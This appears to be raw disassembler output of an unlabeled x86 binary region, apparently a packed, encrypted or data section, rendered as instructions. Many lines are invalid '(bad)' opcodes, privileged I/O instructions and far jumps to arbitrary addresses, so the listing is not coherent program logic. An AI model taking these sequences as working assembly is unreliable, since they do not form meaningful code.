  41f025:	cdq    
  41f026:	ins    BYTE PTR es:[edi],dx
  41f027:	retf   
  41f028:	daa    
  41f029:	call   0xf83d3db2
  41f02e:	push   ecx
  41f02f:	ins    DWORD PTR es:[edi],dx
  41f030:	jnp    0x41efe5
  41f032:	ret    0x48e3
  41f035:	mov    eax,ds:0xd432c9e5
  41f03a:	rcl    BYTE PTR [esi+0x5fda40b6],1
  41f040:	add    al,cl
  41f042:	pop    esi
  41f043:	sbb    eax,0x7e36b998
  41f048:	dec    ebp
  41f049:	sbb    BYTE PTR [edx+0x78923da3],cl
  41f04f:	inc    eax
  41f050:	mov    al,dl
  41f052:	cli    
  41f053:	push   edx
  41f054:	jbe    0x41f0a4
  41f056:	jl     0x41f0ae
  41f058:	call   0xadd4:0x9a9dc7cc
  41f05f:	cmp    eax,0x40a80ffb
  41f064:	inc    edi
  41f065:	or     ebp,DWORD PTR [ecx]
  41f067:	jecxz  0x41f0c8
  41f069:	jl     0x41f00f
  41f06b:	xchg   BYTE PTR [esi],al
  41f06d:	cwde   
  41f06e:	jge    0x41f097
  41f070:	adc    eax,0xfb77922
  41f075:	outs   dx,BYTE PTR ds:[esi]
  41f076:	stos   DWORD PTR es:[edi],eax
  41f077:	aaa    
  41f078:	or     ch,BYTE PTR [edx]
  41f07a:	test   DWORD PTR [esi+edi*8-0x3d15ba48],0x96194741
  41f085:	loop   0x41f0a9
  41f087:	mov    ds:0x5d3cd7bc,al
  41f08c:	stos   BYTE PTR es:[edi],al
  41f08d:	in     al,dx
  41f08e:	loopne 0x41f055
  41f090:	sbb    eax,0x823a9490
  41f095:	icebp  
  41f096:	push   ecx
  41f097:	out    dx,eax
  41f098:	imul   eax,edi,0xffffff89
  41f09b:	cld    
  41f09c:	and    eax,0xbf23e181
  41f0a1:	inc    esi
  41f0a2:	and    BYTE PTR [ebp-0x60],cl
  41f0a5:	mov    esp,DWORD PTR [esi-0x69]
  41f0a8:	fisubr DWORD PTR [edi-0x3010137f]
  41f0ae:	add    BYTE PTR [ebp+0x1f],al
  41f0b1:	push   cs
  41f0b2:	and    eax,0xe302d37a
  41f0b7:	bound  ecx,QWORD PTR [eax-0x64]
  41f0ba:	retf   
  41f0bb:	call   0x4862d622
  41f0c0:	pushf  
  41f0c1:	outs   dx,DWORD PTR ds:[esi]
  41f0c2:	mov    ebp,0x6ef1567d
  41f0c7:	mov    ds:0x9d7283f2,al
  41f0cc:	push   ecx
  41f0cd:	mov    ebp,0xf8189bb
  41f0d2:	inc    eax
  41f0d3:	mov    al,0xeb
  41f0d5:	retf   
  41f0d6:	cmp    dh,ch
  41f0d8:	not    DWORD PTR [ecx]
  41f0da:	add    al,0xb0
  41f0dc:	dec    edx
  41f0dd:	test   DWORD PTR [ebx-0x1c],esp
  41f0e0:	lock adc BYTE PTR [esi],bl
  41f0e3:	clc    
  41f0e4:	sub    ebp,DWORD PTR [esi]
  41f0e6:	cld    
  41f0e7:	mov    bl,0x88
  41f0e9:	daa    
  41f0ea:	mov    al,ds:0x31f2f268
  41f0ef:	add    eax,0xa7456184
  41f0f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0f5:	sbb    al,0x46
  41f0f7:	jp     0x41f12c
  41f0f9:	mov    al,0x7
  41f0fb:	(bad)  
  41f0fc:	pop    ecx
  41f0fd:	sbb    eax,0xaa466cf9
  41f102:	push   cs
  41f103:	mov    ebx,cs
  41f105:	aad    0x87
  41f107:	fst    DWORD PTR [ebx]
  41f109:	cmp    ebx,DWORD PTR [edx-0x75]
  41f10c:	bound  edi,QWORD PTR [ecx]
  41f10e:	mov    eax,ds:0x47f7a6c1
  41f113:	sahf   
  41f114:	mov    edi,0x384fd729
  41f119:	aad    0x44
  41f11b:	(bad)  
  41f11c:	out    dx,al
  41f11d:	xor    DWORD PTR [ebx],ebx
  41f11f:	aaa    
  41f120:	pusha  
  41f121:	loop   0x41f0fa
  41f123:	imul   ebp,DWORD PTR [ebp+0x1011318d],0xc7f65547
  41f12d:	pop    eax
  41f12e:	repz popf 
  41f130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f131:	retf   
  41f132:	xchg   edi,eax
  41f133:	or     DWORD PTR [ebx-0x4e],eax
  41f136:	inc    DWORD PTR [esi]
  41f138:	xchg   BYTE PTR [esi+0x46],bh
  41f13b:	pop    es
  41f13c:	dec    ebp
  41f13d:	jp     0x41f10c
  41f13f:	jg     0x41f15d
  41f141:	popa   
  41f142:	mov    DWORD PTR [ebx+0x4decdf65],ecx
  41f148:	ficom  DWORD PTR [ecx-0x4e]
  41f14b:	cdq    
  41f14c:	mov    cl,0x78
  41f14e:	add    ebp,esi
  41f150:	stos   DWORD PTR es:[edi],eax
  41f151:	push   cs
  41f152:	push   ds
  41f153:	pushf  
  41f154:	xor    edi,esi
  41f156:	xor    esi,DWORD PTR [ebx-0x3e2071d9]
  41f15c:	jg     0x41f13b
  41f15e:	mov    al,ds:0x6a30e8a8
  41f163:	or     DWORD PTR [esi],0x88d78c1f
  41f169:	ret    0xa77f
  41f16c:	jle    0x41f185
  41f16e:	mov    eax,0xf726acc
  41f173:	jecxz  0x41f167
  41f175:	fisttp WORD PTR [esi+0x663b91a3]
  41f17b:	or     BYTE PTR ds:0xc8baf5f0,bh
  41f181:	add    DWORD PTR [ebx],eax
  41f183:	(bad)  
  41f185:	test   al,0x36
  41f187:	fld    st(7)
  41f189:	inc    eax
  41f18a:	ficomp WORD PTR [edi+0x232b9033]
  41f190:	xchg   esi,eax
  41f191:	call   0x41645900
  41f196:	aas    
  41f197:	gs scas al,BYTE PTR es:[edi]
  41f199:	sub    al,0x13
  41f19b:	fisub  DWORD PTR [ebx+edx*2]
  41f19e:	xchg   esp,eax
  41f19f:	mov    esp,0xceb7d42f
  41f1a4:	mov    edx,0x20284f50
  41f1a9:	leave  
  41f1aa:	add    DWORD PTR [esi],ecx
  41f1ac:	daa    
  41f1ad:	sub    al,0xb5
  41f1af:	and    eax,0x1eb307b8
  41f1b4:	sbb    ebp,DWORD PTR [esi+esi*2-0x35]
  41f1b8:	xchg   edx,eax
  41f1b9:	add    ch,bl
  41f1bb:	addr16 test eax,0x13653e35
  41f1c1:	inc    DWORD PTR [eax+0x3a]
  41f1c4:	mov    ds:0x1d8400fe,eax
  41f1c9:	outs   dx,BYTE PTR ds:[esi]
  41f1ca:	push   0x5c
  41f1cc:	inc    esp
  41f1cd:	fsub   st,st(3)
  41f1cf:	into   
  41f1d0:	add    DWORD PTR [edi+eax*8-0xf664f25],0x1a559fa
  41f1db:	cmc    
  41f1dc:	jbe    0x41f25d
  41f1de:	(bad)  
  41f1df:	jmp    0x933d:0x6adeb847
  41f1e6:	adc    BYTE PTR [ebp+0x18],dl
  41f1e9:	or     esi,0xffffffb9
  41f1ec:	ror    DWORD PTR [edx],1
  41f1ee:	icebp  
  41f1ef:	mov    bh,0xd5
  41f1f1:	pop    edi
  41f1f2:	mul    BYTE PTR [edx]
  41f1f4:	ficomp DWORD PTR [esi-0x4f]
  41f1f7:	inc    ecx
  41f1f8:	adc    dh,dh
  41f1fa:	je     0x41f187
  41f1fc:	adc    ch,bl
  41f1fe:	xchg   esi,eax
  41f1ff:	inc    ebx
  41f200:	jmp    0x47f1:0x904e3aba
  41f207:	mov    ecx,0x21bb5ca3
  41f20c:	imul   edi,DWORD PTR [edi-0x107ed130],0xb8db7667
  41f216:	xchg   ecx,eax
  41f217:	xchg   edi,eax
  41f218:	mov    eax,DWORD PTR [eax+esi*2]
  41f21b:	out    dx,eax
  41f21c:	adc    al,0x8d
  41f21e:	out    0x89,eax
  41f220:	pop    esi
  41f221:	push   esp
  41f222:	or     BYTE PTR [edi+0x6519aa2c],ch
  41f228:	xlat   BYTE PTR ds:[ebx]
  41f229:	jmp    0x41f23d
  41f22b:	cmp    ah,BYTE PTR [edi]
  41f22d:	cmp    dl,cl
  41f22f:	sub    esp,DWORD PTR [edi+0x77]
  41f232:	and    eax,0x41f4185f
  41f237:	pop    ds
  41f238:	jmp    0x41f229
  41f23a:	test   DWORD PTR [ebx+0x25],eax
  41f23d:	loopne 0x41f210
  41f23f:	mov    ecx,0x9c79094b
  41f244:	jge    0x41f23e
  41f246:	outs   dx,BYTE PTR ds:[esi]
  41f247:	cmp    ebx,ebp
  41f249:	pop    es
  41f24a:	mov    DWORD PTR [esi],eax
  41f24c:	stos   DWORD PTR es:[edi],eax
  41f24d:	adc    ebx,DWORD PTR [esi]
  41f24f:	syscall 
  41f251:	ja     0x41f26d
  41f253:	mov    eax,ds:0x8e7af9f7
  41f258:	dec    esp
  41f259:	ins    BYTE PTR es:[edi],dx
  41f25a:	lods   al,BYTE PTR ds:[esi]
  41f25b:	cmp    edi,DWORD PTR [ecx+ebx*2-0x3a]
  41f25f:	fsubr  st,st(3)
  41f261:	mov    ebx,0x87b5335
  41f266:	cmp    al,0x41
  41f268:	cmp    bh,bh
  41f26a:	mov    DWORD PTR [edx-0x5a],edx
  41f26d:	pusha  
  41f26e:	xchg   ebp,eax
  41f26f:	mov    eax,ds:0x631cf09b
  41f274:	mov    edx,0xc74b954
  41f279:	dec    edi
  41f27a:	pop    esi
  41f27b:	das    
  41f27c:	dec    esi
  41f27d:	sahf   
  41f27e:	dec    eax
  41f27f:	or     ecx,DWORD PTR [ecx]
  41f281:	inc    esi
  41f282:	push   0x65
  41f284:	scas   ax,WORD PTR es:[edi]
  41f286:	pop    eax
  41f287:	cmp    eax,0x16772926
  41f28c:	in     eax,0x7b
  41f28e:	call   0x9da470b6
  41f293:	mov    ebx,0x296dfdc4
  41f298:	dec    edx
  41f299:	or     DWORD PTR [eax-0x194f22e6],edi
  41f29f:	aad    0xc7
  41f2a1:	mov    al,0xea
  41f2a3:	add    dl,BYTE PTR [ebp+0x216e7874]
  41f2a9:	pusha  
  41f2aa:	mov    ah,0x45
  41f2ac:	jbe    0x41f2db
  41f2ae:	cmc    
  41f2af:	in     al,0xff
  41f2b1:	lock test DWORD PTR [eax],ebx
  41f2b4:	es or  edi,ebp
  41f2b7:	mov    dh,0x3c
  41f2b9:	int3   
  41f2ba:	jl     0x41f2a3
  41f2bc:	scas   eax,DWORD PTR es:[edi]
  41f2bd:	mov    dl,0x43
  41f2bf:	in     eax,0x36
  41f2c1:	in     eax,0x96
  41f2c3:	imul   BYTE PTR [esi+0x14]
  41f2c6:	imul   ebx,DWORD PTR [ebx],0x72c69ac7
  41f2cc:	cmp    bl,dh
  41f2ce:	dec    eax
  41f2cf:	or     ecx,DWORD PTR [eax-0x30d763f2]
  41f2d5:	add    DWORD PTR [eax],esi
  41f2d7:	cmp    ebp,DWORD PTR [bx+di]
  41f2da:	out    0xdf,eax
  41f2dc:	cs fs loop 0x41f2d3
  41f2e0:	mov    ebx,?
  41f2e2:	aaa    
  41f2e3:	sbb    BYTE PTR [edx-0x6af5ea26],ah
  41f2e9:	adc    esi,DWORD PTR [esi+ebx*2+0x6e]
  41f2ed:	cdq    
  41f2ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2ef:	fcomp  DWORD PTR [ebx]
  41f2f1:	adc    BYTE PTR [eax+0x2022240c],bl
  41f2f7:	pop    edx
  41f2f8:	dec    edi
  41f2f9:	push   es
  41f2fa:	sbb    edx,DWORD PTR gs:[ebx-0x2a]
  41f2fe:	jle    0x41f2cd
  41f300:	mov    ds:0x28bfac46,al
  41f305:	lds    ebx,FWORD PTR [ecx]
  41f307:	test   eax,0x10b3e5a7
  41f30c:	adc    BYTE PTR [ebx+0x1b7a988c],0xc8
  41f313:	(bad)  
  41f315:	js     0x41f377
  41f317:	jp     0x41f2c0
  41f319:	mov    ebp,0x7b41d8f4
  41f31e:	rol    BYTE PTR [edi],0xb7
  41f321:	mov    esi,0xc3cb07cc
  41f326:	mov    ebp,0xe6dd8fad
  41f32b:	out    dx,eax
  41f32c:	inc    edx
  41f32d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f32e:	inc    edx
  41f32f:	popa   
  41f330:	and    ecx,0xdf90ec2b
  41f336:	push   ss
  41f337:	mov    WORD PTR [eax-0x1b],fs
  41f33a:	in     eax,dx
  41f33b:	xchg   ecx,eax
  41f33c:	dec    DWORD PTR [eax]
  41f33e:	mov    ecx,0xe867a6a1
  41f343:	inc    esi
  41f344:	jbe    0x41f309
  41f346:	jae    0x41f2f2
  41f348:	imul   esp,DWORD PTR [edx],0x4e92d08d
  41f34e:	jne    0x41f2dd
  41f350:	push   edi
  41f351:	clc    
  41f352:	mov    edx,0x98e89c05
  41f357:	dec    eax
  41f358:	mov    cl,ah
  41f35a:	nop
  41f35b:	ror    DWORD PTR [eax],1
  41f35d:	push   cs
  41f35e:	lods   al,BYTE PTR ds:[esi]
  41f35f:	cmp    al,0x5
  41f361:	adc    eax,0xf7f485ab
  41f366:	or     eax,0x1df09f1
  41f36b:	adc    BYTE PTR [edi],cl
  41f36d:	cld    
  41f36e:	adc    ebx,DWORD PTR [edi]
  41f370:	retf   
  41f371:	adc    BYTE PTR [esi+0x76],cl
  41f374:	sbb    al,0x1e
  41f376:	les    eax,FWORD PTR [eax+0xd41ed73]
  41f37c:	adc    eax,0x6b58f581
  41f381:	cdq    
  41f382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f383:	imul   edi,DWORD PTR [esp+eiz*8],0x38
  41f387:	inc    eax
  41f388:	mov    dh,BYTE PTR [ebx+0x1e]
  41f38b:	push   edx
  41f38c:	jno    0x41f3d4
  41f38e:	mov    edi,0xbfcabc1d
  41f393:	shr    BYTE PTR [ecx+0xa],cl
  41f396:	jb     0x41f32e
  41f398:	out    dx,al
  41f399:	adc    al,0x93
  41f39b:	add    ebx,eax
  41f39d:	mov    dh,0x31
  41f39f:	cmp    DWORD PTR [ebp-0x5740e5ef],esi
  41f3a5:	inc    ecx
  41f3a6:	mov    dh,0x9a
  41f3a8:	in     al,dx
  41f3a9:	pop    esi
  41f3aa:	pop    eax
  41f3ab:	push   es
  41f3ac:	test   BYTE PTR [esi-0x5d06e37a],cl
  41f3b2:	cli    
  41f3b3:	jnp    0x41f387
  41f3b5:	sub    esi,DWORD PTR [edi+0x33]
  41f3b8:	pop    ebp
  41f3b9:	gs in  al,dx
  41f3bb:	xchg   BYTE PTR [eax],ch
  41f3bd:	cli    
  41f3be:	mov    eax,ds:0xde17982e
  41f3c3:	adc    al,0xc9
  41f3c5:	cdq    
  41f3c6:	repnz in eax,0xbd
  41f3c9:	aaa    
  41f3ca:	jl     0x41f39e
  41f3cc:	push   ss
  41f3cd:	and    al,0xe8
  41f3cf:	dec    esi
  41f3d0:	imul   ebp,DWORD PTR [ecx+0x1e],0xbb59b27f
  41f3d7:	and    DWORD PTR [ecx+0x45],ecx
  41f3da:	jne    0x41f450
  41f3dc:	pop    ss
  41f3dd:	into   
  41f3de:	inc    ebx
  41f3df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3e0:	imul   ebp,DWORD PTR [ebp+0x3e],0x47f35c37
  41f3e7:	pop    ebp
  41f3e8:	and    eax,0x38333fbb
  41f3ed:	push   ebp
  41f3ee:	jg     0x41f43f
  41f3f0:	dec    esi
  41f3f1:	dec    edx
  41f3f2:	pushf  
  41f3f3:	dec    ebp
  41f3f4:	inc    ebx
  41f3f5:	or     esp,DWORD PTR [ebx*2+0x1f31bff0]
  41f3fc:	les    ebx,FWORD PTR [eax-0x259e04ee]
  41f402:	mov    dl,0xc8
  41f404:	mov    cl,0x65
  41f406:	lods   eax,DWORD PTR ds:[esi]
  41f407:	shr    DWORD PTR [edi-0x49441c6b],0x11
  41f40e:	loopne 0x41f40b
  41f410:	invd   
  41f412:	adc    cl,BYTE PTR [esi+esi*4+0x124161ea]
  41f419:	inc    edx
  41f41a:	fstp   DWORD PTR [edi+0x7d]
  41f41d:	js     0x41f3e9
  41f41f:	xchg   ebx,eax
  41f420:	mov    esi,0x270f14f0
  41f425:	addr16 jge 0x41f3da
  41f428:	into   
  41f429:	enter  0xf051,0x32
  41f42d:	add    ah,BYTE PTR [eax-0x6d]
  41f430:	sbb    bl,0x24
  41f433:	adc    eax,0x9b2e35c1
  41f438:	mov    ecx,0xfc073ea8
  41f43d:	lock data16 jbe 0x41f3e8
  41f441:	xlat   BYTE PTR ds:[ebx]
  41f442:	or     BYTE PTR [ebp-0x385cba95],dl
  41f448:	cdq    
  41f449:	clc    
  41f44a:	sahf   
  41f44b:	mov    esi,0x65b3fdee
  41f450:	inc    esi
  41f451:	aas    
  41f452:	inc    DWORD PTR [esp+ebp*8-0x12]
  41f456:	das    
  41f457:	pop    edx
  41f458:	mov    ebx,0x90e358e4
  41f45d:	imul   eax,DWORD PTR [eax+edx*2+0x1a],0xffffff91
  41f462:	sar    bh,0xc3
  41f465:	not    BYTE PTR [ebp+0x32]
  41f468:	fst    st(3)
  41f46a:	jbe    0x41f4aa
  41f46c:	xchg   esi,eax
  41f46d:	xchg   DWORD PTR [esi-0x5e],edi
  41f470:	enter  0x2a6e,0xad
  41f474:	push   0xa224abde
  41f479:	pop    ebx
  41f47a:	add    BYTE PTR [edi],ah
  41f47c:	shr    BYTE PTR [esi],0x7b
  41f47f:	push   es
  41f480:	push   ds
  41f481:	jnp    0x41f499
  41f483:	cmp    esp,DWORD PTR [eax]
  41f485:	das    
  41f486:	xchg   BYTE PTR [edx+0x50],ah
  41f489:	inc    DWORD PTR [edi-0x34]
  41f48c:	push   ebp
  41f48d:	inc    ebx
  41f48e:	test   BYTE PTR [esi],ah
  41f490:	sbb    ah,BYTE PTR [ebp+esi*2+0x281dafde]
  41f497:	xchg   ebx,eax
  41f498:	shl    bl,0x4a
  41f49b:	popa   
  41f49c:	mov    al,ds:0xb9391786
  41f4a1:	mov    ebx,DWORD PTR [ebx+ebp*8]
  41f4a4:	dec    ecx
  41f4a5:	iret   
  41f4a6:	test   esi,ebx
  41f4a8:	add    al,0x12
  41f4aa:	loope  0x41f4fd
  41f4ac:	pop    ebp
  41f4ad:	add    eax,0xbf025d2b
  41f4b2:	inc    ecx
  41f4b3:	ret    
  41f4b4:	jecxz  0x41f46a
  41f4b6:	rol    DWORD PTR [esi-0x3370f701],cl
  41f4bc:	stos   BYTE PTR es:[edi],al
  41f4bd:	push   0x13e7111e
  41f4c2:	push   cs
  41f4c3:	jmp    0x41f453
  41f4c5:	inc    esi
  41f4c6:	loope  0x41f517
  41f4c8:	test   al,0x5d
  41f4ca:	ror    esi,0x79
  41f4cd:	ins    BYTE PTR es:[edi],dx
  41f4ce:	push   ebp
  41f4cf:	mov    al,0x9c
  41f4d1:	loopne 0x41f469
  41f4d3:	jo     0x41f4d5
  41f4d5:	mov    ebp,DWORD PTR [eax+0x3f928ff3]
  41f4db:	or     eax,0x366930e8
  41f4e0:	mov    bh,0x47
  41f4e2:	hlt    
  41f4e3:	cmp    DWORD PTR [eax+0x42c5eab3],0x26
  41f4ea:	xchg   ebx,eax
  41f4eb:	push   ecx
  41f4ec:	sub    DWORD PTR [ebp+0xe46ab18],edi
  41f4f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4f3:	add    DWORD PTR [ecx-0x517050e2],0xffffff9f
  41f4fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4fc:	jmp    0x41f489
  41f4fe:	stos   DWORD PTR es:[edi],eax
  41f4ff:	cs sahf 
  41f501:	pop    es
  41f502:	pushf  
  41f503:	sar    BYTE PTR [esi+0x5dae6c8f],1
  41f509:	outs   dx,DWORD PTR ds:[esi]
  41f50a:	lds    edx,FWORD PTR [esi-0x7c16dae6]
  41f510:	add    esp,DWORD PTR [eax+0x74]
  41f513:	shl    DWORD PTR [edi],0x1d
  41f516:	cdq    
  41f517:	mov    dh,0x8a
  41f519:	fist   WORD PTR [ebx+esi*4]
  41f51c:	add    eax,0x7044bab8
  41f521:	mov    cs,WORD PTR [ecx]
  41f523:	pop    ecx
  41f524:	xor    DWORD PTR [edx-0x345dad45],0xdc9be1c
  41f52e:	daa    
  41f52f:	sbb    ebp,DWORD PTR ss:[ebx+0x68]
  41f533:	and    ebp,DWORD PTR [ecx+0x1]
  41f536:	sub    bh,BYTE PTR [ecx-0x30]
  41f539:	push   esp
  41f53a:	mov    ds,WORD PTR [ebx+0xfa9b01a]
  41f540:	pop    ebp
  41f541:	arpl   WORD PTR [edx-0x34],di
  41f544:	mov    BYTE PTR [ecx],cl
  41f546:	add    esi,0x8e2974a0
  41f54c:	cmp    eax,DWORD PTR [ecx+0x52]
  41f54f:	dec    ecx
  41f550:	xchg   DWORD PTR [edx+0x3d],esp
  41f553:	cmp    BYTE PTR [edi],cl
  41f555:	adc    eax,0x3021a80b
  41f55a:	mov    edi,0x40b119b5
  41f55f:	mov    edi,0xb216502d
  41f564:	cdq    
  41f565:	xor    dh,BYTE PTR [ebp+0x7a]
  41f568:	jb     0x41f527
  41f56a:	xor    al,0xc9
  41f56c:	jae    0x41f50f
  41f56e:	retf   0x82d4
  41f571:	pop    ecx
  41f572:	jno    0x41f5be
  41f574:	retf   
  41f575:	pop    esi
  41f576:	inc    edi
  41f577:	add    dl,ah
  41f579:	popf   
  41f57a:	scas   al,BYTE PTR es:[edi]
  41f57b:	push   esp
  41f57c:	es inc bh
  41f57f:	pop    ecx
  41f580:	mov    WORD PTR [edx-0xb],ds
  41f583:	push   cs
  41f584:	mov    al,ds:0xd963bca2
  41f589:	jle    0x41f5b2
  41f58b:	pop    ss
  41f58c:	fistp  DWORD PTR [edi+0x2e]
  41f58f:	out    0xee,eax
  41f591:	xchg   esi,eax
  41f592:	fdiv   st,st(7)
  41f594:	pop    eax
  41f595:	cmp    eax,0x6095d313
  41f59a:	inc    ecx
  41f59b:	push   edi
  41f59c:	pop    ds
  41f59d:	test   eax,0xbcae43b8
  41f5a2:	dec    esp
  41f5a3:	adc    BYTE PTR [esi],0xd7
  41f5a6:	rcl    DWORD PTR [ecx+0x5b],0xc0
  41f5aa:	xor    al,0xb2
  41f5ac:	cmp    al,0xf9
  41f5ae:	fiadd  DWORD PTR [edx-0x33fefca0]
  41f5b4:	idiv   DWORD PTR [ebx]
  41f5b6:	ja     0x41f622
  41f5b8:	lea    ecx,[esi+0x74]
  41f5bb:	ss test ebp,eax
  41f5be:	sbb    bh,BYTE PTR [ebx+0x7a]
  41f5c1:	retf   0xe93
  41f5c4:	ja     0x41f599
  41f5c6:	mov    ebp,0x79f92b61
  41f5cb:	ret    0xd5b5
  41f5ce:	dec    eax
  41f5cf:	mov    bl,0x41
  41f5d1:	adc    ebx,DWORD PTR [edx+esi*4]
  41f5d4:	js     0x41f568
  41f5d6:	adc    eax,0xca76bae6
  41f5db:	leave  
  41f5dc:	enter  0xe9cc,0x8c
  41f5e0:	adc    DWORD PTR [esp+ebp*4],eax
  41f5e3:	ja     0x41f62b
  41f5e5:	mov    eax,ds:0xbb2b18e0
  41f5ea:	sub    ah,BYTE PTR [esi]
  41f5ec:	dec    ebx
  41f5ed:	call   0xea84ef47
  41f5f2:	rol    DWORD PTR [ebx-0x23],1
  41f5f5:	ret    0x5ae
  41f5f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5f9:	lods   eax,DWORD PTR ds:[esi]
  41f5fa:	test   al,0xe4
  41f5fc:	mov    edi,0x6c8c79b5
  41f601:	sub    BYTE PTR [ebx+ebp*8+0x17],al
  41f605:	call   0x1eaaf8c5
  41f60a:	push   ebp
  41f60b:	loop   0x41f64e
  41f60d:	pushf  
  41f60e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f60f:	es scas eax,DWORD PTR es:[edi]
  41f611:	sub    ah,dl
  41f613:	mov    esp,0x9eedfe5a
  41f618:	fild   QWORD PTR [ecx+0x62]
  41f61b:	dec    esp
  41f61c:	push   ds
  41f61d:	jns    0x41f62c
  41f61f:	jge    0x41f63f
  41f621:	and    DWORD PTR [ebx],0xb
  41f624:	mov    eax,0x30a52856
  41f629:	js     0x41f602
  41f62b:	fdiv   DWORD PTR [ebp+0xe1a01ca]
  41f631:	fidiv  WORD PTR [eax]
  41f633:	sbb    DWORD PTR [ebp+ebp*2-0x2e],0x1202850c
  41f63b:	out    0xc0,al
  41f63d:	arpl   WORD PTR [esi+0x49],sp
  41f640:	xchg   esi,eax
  41f641:	mov    dl,0x16
  41f643:	aas    
  41f644:	push   ecx
  41f645:	stos   DWORD PTR es:[edi],eax
  41f646:	(bad)  
  41f647:	sbb    ebp,DWORD PTR [edx+0x7a463b51]
  41f64d:	xchg   edi,eax
  41f64e:	ret    0x852d
  41f651:	div    ch
  41f653:	test   BYTE PTR [ebp-0xb36d000],al
  41f659:	add    edx,ecx
  41f65b:	jbe    0x41f6af
  41f65d:	adc    al,0x5b
  41f65f:	test   esp,eax
  41f661:	push   0xaf01230a
  41f666:	lods   al,BYTE PTR ds:[esi]
  41f667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f668:	cwde   
  41f669:	push   esi
  41f66a:	dec    edi
  41f66b:	icebp  
  41f66c:	dec    esp
  41f66d:	or     ah,ah
  41f66f:	outs   dx,DWORD PTR ds:[esi]
  41f670:	adc    al,0x4f
  41f672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f673:	push   eax
  41f674:	daa    
  41f675:	pusha  
  41f676:	push   esi
  41f677:	icebp  
  41f678:	and    al,0x70
  41f67a:	add    eax,0xe2f33fd6
  41f67f:	shl    ah,cl
  41f681:	mov    ah,BYTE PTR [edi+0x7dc87544]
  41f687:	xlat   BYTE PTR ds:[ebx]
  41f688:	mov    ds:0x6b91dd26,al
  41f68d:	or     eax,DWORD PTR [edx]
  41f68f:	icebp  
  41f690:	(bad)  
  41f691:	(bad)  
  41f692:	mov    edx,0xd5d81be2
  41f697:	mov    ?,edi
  41f699:	sub    ebp,edx
  41f69b:	xchg   edi,eax
  41f69c:	(bad)  
  41f69d:	sbb    ch,BYTE PTR [eax+0x4a]
  41f6a0:	mov    eax,0x1c859a01
  41f6a5:	xor    DWORD PTR [eax+0x713e9844],esi
  41f6ab:	xchg   ebx,eax
  41f6ac:	repz add cl,ah
  41f6af:	fbld   TBYTE PTR [edi+edx*8+0x71]
  41f6b3:	icebp  
  41f6b4:	aad    0x36
  41f6b6:	loopne 0x41f702
  41f6b8:	mov    ds:0xb115b926,eax
  41f6bd:	jne    0x41f6ab
  41f6bf:	mov    BYTE PTR [ecx+0x35],al
  41f6c2:	xchg   edi,eax
  41f6c3:	jecxz  0x41f6b8
  41f6c5:	inc    DWORD PTR [edx+0x383fd0a3]
  41f6cb:	retf   
  41f6cc:	out    0x9c,eax
  41f6ce:	aas    
  41f6cf:	sbb    ah,BYTE PTR [ecx+0x49f4c6ba]
  41f6d5:	sbb    ecx,DWORD PTR [ebx+0x31068e11]
  41f6db:	pusha  
  41f6dc:	dec    esp
  41f6dd:	mov    WORD PTR [edi+eax*1+0x13fb941c],ds
  41f6e4:	mov    edi,0x8769d6d3
  41f6e9:	xchg   ebx,eax
  41f6ea:	xchg   edi,eax
  41f6eb:	jecxz  0x41f723
  41f6ed:	fmul   DWORD PTR [ebx+0x7]
  41f6f0:	rol    DWORD PTR [edi-0xd],0xd9
  41f6f4:	dec    ebp
  41f6f5:	mov    ch,0xa
  41f6f7:	dec    eax
  41f6f8:	push   eax
  41f6f9:	fstp   QWORD PTR [edi+0x4c797496]
  41f6ff:	cli    
  41f700:	int3   
  41f701:	sbb    dl,BYTE PTR [esi+0x73]
  41f704:	xchg   edx,eax
  41f705:	shl    BYTE PTR [ebp+0x23],cl
  41f708:	push   ds
  41f709:	fimul  WORD PTR [esi-0x201fe9c4]
  41f70f:	push   0x9f60a361
  41f714:	retf   0x1d30
  41f717:	outs   dx,DWORD PTR ds:[esi]
  41f718:	loopne 0x41f6d0
  41f71a:	jle    0x41f779
  41f71c:	xor    DWORD PTR [ebp+0x63],esp
  41f71f:	jb     0x41f6e7
  41f721:	das    
  41f722:	aam    0xce
  41f724:	test   al,0xb3
  41f726:	sbb    DWORD PTR [ebx-0x13eec21d],esi
  41f72c:	rcr    BYTE PTR [edi+0x6ecfe732],1
  41f732:	fld    DWORD PTR [edi]
  41f734:	loop   0x41f76a
  41f736:	js     0x41f6c4
  41f738:	sub    al,0xc6
  41f73a:	retf   0x7b85
  41f73d:	icebp  
  41f73e:	add    al,0xa6
  41f740:	rcr    BYTE PTR [eax+0x73],1
  41f743:	mov    ch,0x89
  41f745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f746:	jp     0x41f70a
  41f748:	jmp    0xebc3:0x7943150e
  41f74f:	aaa    
  41f750:	inc    esi
  41f751:	xchg   ecx,eax
  41f752:	sub    BYTE PTR [edx],al
  41f754:	jno    0x41f766
  41f756:	pop    eax
  41f757:	dec    esi
  41f758:	xchg   ebp,eax
  41f759:	fisubr DWORD PTR [edi+0x397265a4]
  41f75f:	dec    ecx
  41f760:	(bad)  
  41f761:	sub    eax,0xf18109a4
  41f766:	lods   al,BYTE PTR ds:[esi]
  41f767:	and    cl,BYTE PTR [ebp-0x785214f1]
  41f76d:	adc    eax,0xa1f2dc28
  41f772:	push   eax
  41f773:	cmp    ah,bl
  41f775:	mov    bh,0x0
  41f777:	xchg   edi,eax
  41f778:	mov    ?,WORD PTR [ecx]
  41f77a:	xlat   BYTE PTR ds:[ebx]
  41f77b:	sbb    eax,0x1ba4fdd3
  41f780:	div    DWORD PTR [esi+edx*2-0x369da82d]
  41f787:	test   eax,0x598a7e55
  41f78c:	push   0x513239f0
  41f791:	(bad)
  41f794:	in     al,dx
  41f795:	mov    esp,0x85e5277a
